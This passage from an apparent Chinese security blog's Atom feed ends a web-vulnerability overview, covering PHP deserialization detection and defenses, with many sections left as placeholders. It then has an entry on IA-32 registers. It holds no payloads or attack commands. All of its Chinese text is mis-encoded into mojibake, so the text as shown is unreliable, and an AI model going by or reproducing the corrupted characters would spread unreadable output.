è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ªE_NOTICEçº§åˆ«çš„é”™è¯¯ã€‚</p><p>_<em>wakeup()ï¼šç»å¸¸ç”¨åœ¨ååºåˆ—åŒ–æ“ä½œä¸­ï¼Œä¾‹å¦‚é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥ï¼Œæˆ–æ‰§è¡Œå…¶å®ƒåˆå§‹åŒ–æ“ä½œã€‚unserialize()ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª\</em>_wakeup()æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨__wakeup()ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚</p><p><strong>PHPååºåˆ—åŒ–æ¼æ´åˆ†ç±»</strong></p><p>unserialize()ååºåˆ—åŒ–æ¼æ´</p><p>sessionååºåˆ—åŒ–æ¼æ´</p><p>pharååºåˆ—åŒ–æ¼æ´</p><h3 id="äºŒã€æ£€æµ‹æ–¹æ³•-2"><a href="#äºŒã€æ£€æµ‹æ–¹æ³•-2" class="headerlink" title="äºŒã€æ£€æµ‹æ–¹æ³•"></a>äºŒã€æ£€æµ‹æ–¹æ³•</h3><p>ä»¥PHPä¸ºä¾‹ï¼Œå…¨å±€æœç´¢PHPçš„ååºåˆ—åŒ–å‡½æ•°å¦‚unserialize()ï¼ŒæŸ¥çœ‹å…¶ä¸­æ¶‰åŠçš„æ–‡ä»¶ä»£ç ä¸­æ˜¯å¦å«æœ‰é­”æ³•å‡½æ•°æˆ–å…¶ä»–å±é™©çš„ç±»æ–¹æ³•ï¼Œä¸”è¿›ä¸€æ­¥æ’æŸ¥é­”æ³•å‡½æ•°çš„å†…å®¹æ˜¯å¦å¤–ç•Œå¯æ§ä¸”å­˜åœ¨å±é™©æ“ä½œã€‚</p><h3 id="ä¸‰ã€é˜²å¾¡æ–¹æ³•-2"><a href="#ä¸‰ã€é˜²å¾¡æ–¹æ³•-2" class="headerlink" title="ä¸‰ã€é˜²å¾¡æ–¹æ³•"></a>ä¸‰ã€é˜²å¾¡æ–¹æ³•</h3><p>1ã€è¦ä¸¥æ ¼æ§åˆ¶unserialize()å‡½æ•°çš„å‚æ•°ï¼ŒåšæŒç”¨æˆ·æ‰€è¾“å…¥çš„ä¿¡æ¯éƒ½æ˜¯ä¸å¯é çš„åŸåˆ™ï¼›</p><p>2ã€è¦å¯¹äºååºåˆ—åŒ–åçš„å˜é‡å†…å®¹è¿›è¡Œæ£€æŸ¥ï¼Œä»¥ç¡®å®šå†…å®¹æ²¡æœ‰è¢«æ±¡æŸ“ã€‚</p><h2 id="XPathæ³¨å…¥"><a href="#XPathæ³¨å…¥" class="headerlink" title="XPathæ³¨å…¥"></a>XPathæ³¨å…¥</h2><h3 id="ä¸€ã€åŸºæœ¬æ¦‚å¿µ-12"><a href="#ä¸€ã€åŸºæœ¬æ¦‚å¿µ-12" class="headerlink" title="ä¸€ã€åŸºæœ¬æ¦‚å¿µ"></a>ä¸€ã€åŸºæœ¬æ¦‚å¿µ</h3><p><strong>æ¼æ´å®šä¹‰</strong></p><p>å¾…å®Œå–„â€¦</p><h3 id="äºŒã€æ£€æµ‹æ–¹æ³•-3"><a href="#äºŒã€æ£€æµ‹æ–¹æ³•-3" class="headerlink" title="äºŒã€æ£€æµ‹æ–¹æ³•"></a>äºŒã€æ£€æµ‹æ–¹æ³•</h3><p>å¾…å®Œå–„â€¦</p><h3 id="ä¸‰ã€é˜²å¾¡æ–¹æ³•-3"><a href="#ä¸‰ã€é˜²å¾¡æ–¹æ³•-3" class="headerlink" title="ä¸‰ã€é˜²å¾¡æ–¹æ³•"></a>ä¸‰ã€é˜²å¾¡æ–¹æ³•</h3><p>å¾…å®Œå–„â€¦</p><h2 id="LDAPæ³¨å…¥"><a href="#LDAPæ³¨å…¥" class="headerlink" title="LDAPæ³¨å…¥"></a>LDAPæ³¨å…¥</h2><p>å…·ä½“å¯å‚è€ƒ<a href="http://www.4hou.com/technology/9090.html" target="_blank" rel="noopener">æŠ€æœ¯è¯¦è§£ï¼šåŸºäºWebçš„LDAPæ³¨å…¥æ¼æ´</a></p><h2 id="CRLFæ³¨å…¥"><a href="#CRLFæ³¨å…¥" class="headerlink" title="CRLFæ³¨å…¥"></a>CRLFæ³¨å…¥</h2><p>å¾…å®Œå–„â€¦</p><h2 id="URLä¸å®‰å…¨é‡å®šå‘"><a href="#URLä¸å®‰å…¨é‡å®šå‘" class="headerlink" title="URLä¸å®‰å…¨é‡å®šå‘"></a>URLä¸å®‰å…¨é‡å®šå‘</h2><p>å¾…å®Œå–„â€¦</p><h2 id="ç‚¹å‡»åŠ«æŒ"><a href="#ç‚¹å‡»åŠ«æŒ" class="headerlink" title="ç‚¹å‡»åŠ«æŒ"></a>ç‚¹å‡»åŠ«æŒ</h2><p>å¾…å®Œå–„â€¦</p><h2 id="HTML5å®‰å…¨"><a href="#HTML5å®‰å…¨" class="headerlink" title="HTML5å®‰å…¨"></a>HTML5å®‰å…¨</h2><p>å¾…å®Œå–„â€¦</p><h2 id="Webç¼“å­˜æ”»å‡»"><a href="#Webç¼“å­˜æ”»å‡»" class="headerlink" title="Webç¼“å­˜æ”»å‡»"></a>Webç¼“å­˜æ”»å‡»</h2><p>å¾…å®Œå–„â€¦</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;è¿™é‡Œå°ç»“ä¸€ä¸‹å¸¸è§çš„Webæ¼æ´ç±»å‹ï¼Œå¾…å®Œå–„ã€‚&lt;/p&gt;
&lt;h2 id=&quot;SQLæ³¨å…¥ä¸SQLç›²æ³¨&quot;&gt;&lt;a href=&quot;#SQLæ³¨å…¥ä¸SQLç›²æ³¨&quot; class=&quot;headerlink&quot; title=&quot;SQLæ³¨å…¥ä¸SQLç›²æ³¨&quot;&gt;&lt;/a&gt;SQLæ³¨å…¥ä¸SQLç›²æ³¨&lt;/h2&gt;&lt;h3 id=&quot;
      
    
    </summary>
    
      <category term="Webå®‰å…¨åŸºç¡€" scheme="https://Mi1k7ea.github.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Webå®‰å…¨" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>IA-32ï¼ˆIntel Architecture 32ä½ï¼‰å¯„å­˜å™¨</title>
    <link href="https://Mi1k7ea.github.com/2019/01/28/IA-32%E5%AF%84%E5%AD%98%E5%99%A8/"/>
    <id>https://Mi1k7ea.github.com/2019/01/28/IA-32å¯„å­˜å™¨/</id>
    <published>2019-01-28T15:51:20.000Z</published>
    <updated>2019-02-08T14:21:14.595Z</updated>
    
    <content type="html"><![CDATA[<h2 id="é€šç”¨å¯„å­˜å™¨"><a href="#é€šç”¨å¯„å­˜å™¨" class="headerlink" title="é€šç”¨å¯„å­˜å™¨"></a>é€šç”¨å¯„å­˜å™¨</h2><p>ç”¨äºä¼ é€å’Œæš‚å­˜æ•°æ®ï¼Œå‚ä¸ç®—æ•°é€»è¾‘è¿ç®—å¹¶ä¿å­˜è¿ç®—ç»“æœã€‚IA-32æ¯ä¸ªé€šç”¨å¯„å­˜å™¨çš„å¤§å°éƒ½æ˜¯32ä½ï¼Œå³4ä¸ªå­—èŠ‚ï¼Œä¸»è¦ç”¨æ¥ä¿å­˜å¸¸é‡å’Œåœ°å€ç­‰ä¿¡æ¯ã€‚</p><p>ä»¥ä¸‹4ä¸ªé€šç”¨å¯„å­˜å™¨ä¸»è¦ç”¨äºç®—æœ¯è¿ç®—å¦‚ADDã€SUBã€XORã€ORç­‰ï¼Œå¸¸ç”¨äºä¿å­˜å¸¸é‡ä¸å˜é‡çš„å€¼ã€‚</p><p>EAXï¼šï¼ˆé’ˆå¯¹æ“ä½œæ•°å’Œç»“æœæ•°æ®çš„ï¼‰ç´¯åŠ å™¨ï¼Œä¸€èˆ¬ç”¨åœ¨å‡½æ•°è¿”å›å€¼ä¸­ï¼Œæ‰€æœ‰Win32 APIå‡½æ•°éƒ½ä¼šæŠŠè¿”å›å€¼ä¿å­˜åˆ°EAXåå†è¿”å›ã€‚EAXå¯„å­˜å™¨åˆåˆ†ä¸ºé«˜ã€ä½å‡ ä¸ªç‹¬ç«‹çš„å¯„å­˜å™¨ï¼ŒAXï¼ˆ0-15ï¼‰ä¸ºEAXï¼ˆ0-31ï¼‰çš„ä½16ä½ç‹¬ç«‹å¯„å­˜å™¨ï¼Œè€ŒAXåˆåˆ†ä¸ºé«˜8ä½çš„AHï¼ˆ8-15ï¼‰å’Œä½8ä½çš„ALï¼ˆ0-7ï¼‰ä¸¤ä¸ªç‹¬ç«‹å¯„å­˜å™¨ï¼Œä¸‹é¢çš„EBXã€ECXå’ŒEDXåŒç†ã€‚</p><p>EBXï¼šï¼ˆDSæ®µä¸­çš„æ•°æ®æŒ‡é’ˆï¼‰åŸºå€å¯„å­˜å™¨ã€‚</p><p>ECXï¼šï¼ˆå­—ç¬¦ä¸²å’Œå¾ªç¯æ“ä½œçš„ï¼‰è®¡æ•°å™¨ï¼Œå¦‚åœ¨å¾ªç¯å‘½ä»¤LOOPä¸­ç”¨æ¥å¾ªç¯è®¡æ•°ã€æ¯æ‰§è¡Œå®Œä¸€æ¬¡å¾ªç¯ECXå°±è‡ªå‡ä¸€ã€‚</p><p>EDXï¼šï¼ˆI/OæŒ‡é’ˆï¼‰æ•°æ®å¯„å­˜å™¨ã€‚</p><p>ä»¥ä¸‹4ä¸ªé€šç”¨å¯„å­˜å™¨ä¸»è¦ç”¨äºä¿å­˜å†…å­˜åœ°å€çš„æŒ‡é’ˆã€‚</p><p>ESIï¼šï¼ˆå­—ç¬¦ä¸²æ“ä½œæºæŒ‡é’ˆï¼‰æºå˜å€å¯„å­˜å™¨ã€‚</p><p>EDIï¼šï¼ˆå­—ç¬¦ä¸²æ“ä½œç›®æ ‡æŒ‡é’ˆï¼‰ç›®çš„å˜å€å¯„å­˜å™¨ï¼ŒESIå’ŒEDIä¸ç‰¹å®šæŒ‡ä»¤ï¼ˆLODSã€STOSã€REPã€MOVSç­‰ï¼‰ä¸€èµ·ä½¿ç”¨ï¼Œä¸»è¦ç”¨äºå†…å­˜å¤åˆ¶ã€‚</p><p>EBPï¼šï¼ˆSSæ®µä¸­æ ˆå†…æ•°æ®æŒ‡é’ˆï¼‰æ‰©å±•åŸºå€æŒ‡é’ˆå¯„å­˜å™¨ï¼Œè¡¨ç¤ºæ ˆåŒºåŸŸçš„åŸºåœ°å€ï¼Œå³æŒ‡å‘æ ˆæœ€ä¸Šé¢çš„ä¸€ä¸ªæ ˆå¸§çš„åº•éƒ¨ï¼Œå‡½æ•°è¢«è°ƒç”¨æ—¶ä¿å­˜ESPçš„å€¼ï¼Œå‡½æ•°è¿”å›æ—¶å†æŠŠå€¼è¿”å›ESPï¼Œä¿è¯æ ˆä¸ä¼šå´©æºƒï¼ˆå³æ ˆå¸§æŠ€æœ¯ï¼‰ã€‚</p><p>ESPï¼šï¼ˆSSæ®µä¸­æ ˆæŒ‡é’ˆï¼‰æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼ŒæŒ‡å‘æ ˆåŒºåŸŸçš„æ ˆé¡¶åœ°å€ã€‚</p><h2 id="æ®µå¯„å­˜å™¨"><a href="#æ®µå¯„å­˜å™¨" class="headerlink" title="æ®µå¯„å­˜å™¨"></a>æ®µå¯„å­˜å™¨</h2><p>åœ¨IA-32çš„ä¿æŠ¤æ¨¡å¼ä¸­ï¼Œæ®µæ˜¯ä¸€ç§å†…å­˜ä¿æŠ¤æŠ€æœ¯ï¼Œå°†å†…å­˜åˆ’åˆ†ä¸ºå¤šä¸ªåŒºæ®µï¼Œå¹¶ä¸ºæ¯ä¸ªåŒºæ®µèµ‹äºˆèµ·å§‹åœ°å€ã€èŒƒå›´ã€è®¿é—®æƒé™ç­‰ä»¥ä¿æŠ¤å†…å­˜ã€‚æ®µå†…å­˜è®°å½•åœ¨SDTä¸­ï¼Œè€Œæ®µå¯„å­˜å™¨æŒæœ‰è¿™äº›SDTçš„ç´¢å¼•ã€‚æ¯ä¸ªæ®µå¯„å­˜å™¨çš„å¤§å°ä¸º16ä½ï¼Œå³2ä¸ªå­—èŠ‚ï¼Œä¸”æ¯ä¸ªæ®µå¯„å­˜å™¨æŒ‡å‘çš„æ®µæè¿°ç¬¦ä¸è™šæ‹Ÿå†…å­˜ç»“åˆï¼Œå½¢æˆä¸€ä¸ªçº¿æ€§åœ°å€ï¼Œå€ŸåŠ©åˆ†é¡µæŠ€æœ¯ï¼Œçº¿æ€§åœ°å€æœ€ç»ˆè¢«è½¬æ¢ä¸ºå®é™…çš„ç‰©ç†åœ°å€ã€‚</p><p>CSï¼šCode Segmentï¼Œä»£ç æ®µå¯„å­˜å™¨ã€‚</p><p>DSï¼šData Segmentï¼Œæ•°æ®æ®µå¯„å­˜å™¨ã€‚</p><p>SSï¼šStack Segmentï¼Œæ ˆæ®µå¯„å­˜å™¨ã€‚</p><p>ESï¼šExtra (Data) Segmentï¼Œé™„åŠ ï¼ˆæ•°æ®ï¼‰æ®µå¯„å­˜å™¨ã€‚</p><p>FSï¼šData Segmentï¼Œæ•°æ®æ®µå¯„å­˜å™¨ï¼Œåœ¨ç¨‹åºè°ƒè¯•ä¸­ç»å¸¸ç”¨äºè®¡ç®—SEHï¼ˆç»“æ„åŒ–å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼‰ã€TEBï¼ˆçº¿ç¨‹ç¯å¢ƒå—ï¼‰ã€PEBï¼ˆè¿›ç¨‹ç¯å¢ƒå—ï¼‰ã€‚</p><p>GSï¼šData Segmentï¼Œæ•°æ®æ®µå¯„å­˜å™¨ã€‚</p><p>å…¶ä¸­ESã€FSã€GSå¯„å­˜å™¨ç”¨æ¥å­˜æ”¾ç¨‹åºä½¿ç”¨çš„é™„åŠ æ•°æ®æ®µçš„æ®µåŸºå€ã€‚</p><h2 id="ç¨‹åºçŠ¶æ€ä¸æ§åˆ¶å¯„å­˜å™¨"><a href="#ç¨‹åºçŠ¶æ€ä¸æ§åˆ¶å¯„å­˜å™¨" class="headerlink" title="ç¨‹åºçŠ¶æ€ä¸æ§åˆ¶å¯„å­˜å™¨"></a>ç¨‹åºçŠ¶æ€ä¸æ§åˆ¶å¯„å­˜å™¨</h2><p>EFLAGSï¼šFlag Registerï¼Œæ ‡å¿—å¯„å­˜å™¨ï¼Œå¤§å°ä¸º4ä¸ªå­—èŠ‚å³32ä½ï¼Œæ¯ä¸€ä½éƒ½æœ‰æ„ä¹‰ï¼Œæœ‰äº›ä½ç”±ç³»ç»Ÿç›´æ¥è®¾å®šï¼Œæœ‰äº›ä½åˆ™æ ¹æ®ç¨‹åºå‘½ä»¤çš„æ‰§è¡Œç»“æœè®¾ç½®ã€‚</p><p><img src="/2019/01/28/IA-32å¯„å­˜å™¨/1.png" alt="å¯„å­˜å™¨"> </p><p>å…ˆäº†è§£3ä¸ªå¸¸ç”¨çš„ä¸ç¨‹åºè°ƒè¯•ç›¸å…³çš„æ ‡å¿—ï¼ŒZFï¼ˆZero Flagé›¶æ ‡å¿—ï¼‰ã€OFï¼ˆOverflow Flagæº¢å‡ºæ ‡å¿—ï¼‰ã€CFï¼ˆCarry Flagè¿›ä½æ ‡å¿—ï¼‰ã€‚</p><p>ZFï¼šè‹¥è¿ç®—ç»“æœä¸º0ï¼Œåˆ™ä¸º1ï¼ˆTrueï¼‰ï¼Œå¦åˆ™ä¸º0ï¼ˆFalseï¼‰ã€‚</p><p>OFï¼šæœ‰ç¬¦å·æ•´æ•°æº¢å‡ºæ—¶ï¼Œåˆ™ä¸º1ã€‚æ­¤å¤–ï¼ŒMSBï¼ˆæœ€é«˜æœ‰æ•ˆä½ï¼‰æ”¹å˜æ—¶ï¼Œä¹Ÿä¸º1ã€‚</p><p>CFï¼šæ— ç¬¦å·æ•´æ•°æº¢å‡ºæ—¶ï¼Œåˆ™ä¸º1ã€‚</p><h2 id="æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨"><a href="#æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨" class="headerlink" title="æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨"></a>æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨</h2><p>EIPï¼šInstruction Pointerï¼ŒæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼Œä¿å­˜ç€CPUè¦æ‰§è¡Œçš„æŒ‡ä»¤åœ°å€ï¼Œå¤§å°ä¸º32ä½å³4ä¸ªå­—èŠ‚ã€‚</p><p>ç¨‹åºè¿è¡Œæ—¶ï¼ŒCPUä¼šè¯»å–EIPä¸­çš„ä¸€æ¡æŒ‡ä»¤åœ°å€ï¼Œä¼ é€æŒ‡ä»¤åˆ°æŒ‡ä»¤ç¼“å†²åŒºåï¼ŒEIPå¯„å­˜å™¨çš„å€¼å°†è‡ªåŠ¨å¢åŠ ï¼Œå¢åŠ çš„å¤§å°ä¸ºè¯»å–æŒ‡ä»¤çš„å­—èŠ‚å¤§å°ã€‚CPUæ¯æ¬¡æ‰§è¡Œå®Œä¸€æ¡æŒ‡ä»¤ï¼Œå°±ä¼šé€šè¿‡EIPå¯„å­˜å™¨è¯»å–å¹¶æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</p><p>æ³¨æ„çš„å°±æ˜¯ï¼ŒEIPå¯„å­˜å™¨å’Œé€šç”¨å¯„å­˜å™¨ä¸åŒï¼Œä¸èƒ½ç›´æ¥ä¿®æ”¹EIPçš„å€¼ï¼Œåªèƒ½é€šè¿‡å…¶ä»–æŒ‡ä»¤é—´æ¥ä¿®æ”¹ï¼Œå¦‚JMPã€Jccã€CALLã€RETã€‚ä¹Ÿå¯ä»¥é€šè¿‡ä¸­æ–­æˆ–è€…å¼‚å¸¸æ¥ä¿®æ”¹EIPçš„å€¼ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;é€šç”¨å¯„å­˜å™¨&quot;&gt;&lt;a href=&quot;#é€šç”¨å¯„å­˜å™¨&quot; class=&quot;headerlink&quot; title=&quot;é€šç”¨å¯„å­˜å™¨&quot;&gt;&lt;/a&gt;é€šç”¨å¯„å­˜å™¨&lt;/h2&gt;&lt;p&gt;ç”¨äºä¼ é€å’Œæš‚å­˜æ•°æ®ï¼Œå‚ä¸ç®—æ•°é€»è¾‘è¿ç®—å¹¶ä¿å­˜è¿ç®—ç»“æœã€‚IA-32æ¯ä¸ªé€šç”¨å¯„å­˜å™¨çš„å¤§å°éƒ½æ˜¯32ä½ï¼Œå³4ä¸ªå­—èŠ‚ï¼Œä¸»è¦ç”¨æ¥ä¿
      
    
    </summary>
    
      <category term="äºŒè¿›åˆ¶åŸºç¡€" scheme="https://Mi1k7ea.github.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="äºŒè¿›åˆ¶" scheme="https://Mi1k7ea.github.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
</feed>
